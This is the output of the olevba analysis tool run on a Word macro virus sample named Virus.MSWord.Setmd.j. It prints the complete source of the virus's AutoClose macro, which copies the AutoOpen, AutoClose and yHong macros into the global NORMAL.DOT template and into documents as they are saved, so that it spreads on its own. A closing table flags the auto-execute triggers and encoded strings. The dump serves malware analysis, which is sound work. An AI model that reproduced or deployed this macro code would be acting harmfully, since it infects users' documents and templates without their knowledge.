olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Setmd.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Setmd.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Setmd.j - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'yHong1s

Public Sub MAIN()
Dim TemplateName$
Dim MyFile$
Dim My
Dim OkExist
Dim i
Dim beSave
Dim X
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
' Get normal template name
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "文档") = 1 Then
    GoTo The_End
Else
    WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
End If
If WordBasic.IsMacro(0) = -1 Then GoTo The_End

My = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To My
    If WordBasic.[MacroName$](i, 1) = "AutoClose" Then OkExist = 1
Next i

If OkExist = 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoClose", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="yHong", Tab:=1
End If

beSave = 0

If WordBasic.IsDocumentDirty() = -1 Then
    X = WordBasic.MsgBox("是否保存对 " + MyFile$ + " 的修改?", "Microsoft Word", 51)
    If X = 0 Then
        WordBasic.SetDocumentDirty 0
        GoTo The_End
    End If
    If X = 1 Then
        GoTo The_End
    End If
    beSave = 1
End If

If dlg.Format = 0 Then
    
    
    
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

' copy AutoOpen to active template

If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoClose", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="yHong", Tab:=1
    beSave = 1
End If

OkExist = 0
For i = 1 To My
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="yHong", Tab:=1
    beSave = 1
End If
If beSave = 1 Then WordBasic.FileSave
The_End:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Setmd.j - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

